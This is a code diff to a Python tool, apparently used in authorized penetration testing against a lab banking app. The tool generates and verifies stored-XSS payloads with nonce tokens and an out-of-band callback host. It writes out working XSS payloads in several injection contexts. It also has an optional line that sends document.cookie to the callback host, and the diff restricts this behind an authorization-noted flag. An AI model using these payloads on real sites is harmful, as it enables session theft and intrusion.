@@ -13,26 +13,33 @@
       --url http://vuln-bank-web:5000/comments --state engagements/<dir>/sessions/userB.state.json \
       --admin-bot http://admin-bot:8000 --oast http://oast:8080 --shot engagements/<dir>/scan/xss-mx1a2b3c4d.png
 
-Verdict: validated only if the canary fired in the browser or the OAST log holds this token.
+verify reports evidence only (browser_hit, oast_hit, nonce, timestamps); it never sets a closure
+state. The caller sets it from that evidence under the exploit skill's rules. Exit 0 = some
+evidence was observed, 1 = none.
 """
 import argparse, json, os, secrets, sys, time, urllib.request
 from pathlib import Path
 
 
-def payloads(t, oast):
-    js = f"console.log('MYTHOS-XSS:{t}');alert('MYTHOS-XSS:{t}')"
+def payloads(t, oast, include_cookies=False):
+    # Statements for HTML contexts, one comma expression for the JS-string context (a `;` there
+    # would end the injected expression). Both use single quotes only, so they sit inside a
+    # double-quoted attribute; the proof is the nonce plus the origin, no session data by default.
+    calls = [f"console.log('MYTHOS-XSS:{t}')", f"alert('MYTHOS-XSS:{t}')"]
     if oast:
-        js += f";new Image().src='{oast.rstrip('/')}/{t}?c='+encodeURIComponent(document.cookie)"
+        q = "'&c='+encodeURIComponent(document.cookie)" if include_cookies else "''"
+        calls.append(f"new Image().src='{oast.rstrip('/')}/{t}?o='+encodeURIComponent(location.origin)+{q}")
+    js = ";".join(calls)
     return [f'<img src=x onerror="{js}">',
             f'"><svg onload="{js}">',
             f"<script>{js}</script>",
-            f"'-{js}-'",  # inside a JS string context
+            f"'-({','.join(calls)})-'",  # inside a JS string context
             f"javascript:{js}"]  # href / src sinks
 
 
 def cmd_token(a):
     t = "mx" + secrets.token_hex(4)
-    rec = {"token": t, "point": a.point, "ts": time.strftime("%Y-%m-%dT%H:%M:%S"), "payloads": payloads(t, a.oast)}
+    rec = {"token": t, "point": a.point, "ts": time.strftime("%Y-%m-%dT%H:%M:%S"), "payloads": payloads(t, a.oast, a.include_cookies)}
     with open(a.map, "a") as f:
         f.write(json.dumps(rec) + "\n")
     print(json.dumps(rec, indent=1))
@@ -80,7 +87,7 @@ def oast_hits(a, t):
 
 
 def cmd_verify(a):
-    t, res = a.token, {"token": a.token, "url": a.url}
+    t, res = a.token, {"nonce": a.token, "url": a.url, "started": time.strftime("%Y-%m-%dT%H:%M:%S")}
     if not a.no_browser:
         res["browser"] = browser(a, t)
         res["screenshot"] = a.shot
@@ -97,9 +104,11 @@ def cmd_verify(a):
             if res["oast"] or time.time() >= deadline:
                 break
             time.sleep(3)
-    res["verdict"] = "validated" if res.get("browser") or res["oast"] else "unconfirmed"
+    res["browser_hit"] = bool(res.get("browser"))
+    res["oast_hit"] = bool(res["oast"])
+    res["finished"] = time.strftime("%Y-%m-%dT%H:%M:%S")
     print(json.dumps(res, indent=1))
-    return 0 if res["verdict"] == "validated" else 1
+    return 0 if res["browser_hit"] or res["oast_hit"] else 1
 
 
 def main():
@@ -109,6 +118,9 @@ def main():
     k.add_argument("--map", required=True, help="token map JSONL (token -> injection point)")
     k.add_argument("--point", required=True, help='where it goes, e.g. "POST /api/profile body.bio"')
     k.add_argument("--oast", help="callback base, e.g. http://oast:8080 or http://<id>.oast.fun")
+    k.add_argument("--include-cookies", action="store_true",
+                   help="also send document.cookie to the OAST host: this exfiltrates session data "
+                        "and needs the program's authorization; the default proof is nonce + origin")
     v = sub.add_parser("verify")
     v.add_argument("--token", required=True)
     v.add_argument("--url", required=True, help="page where the stored payload renders")
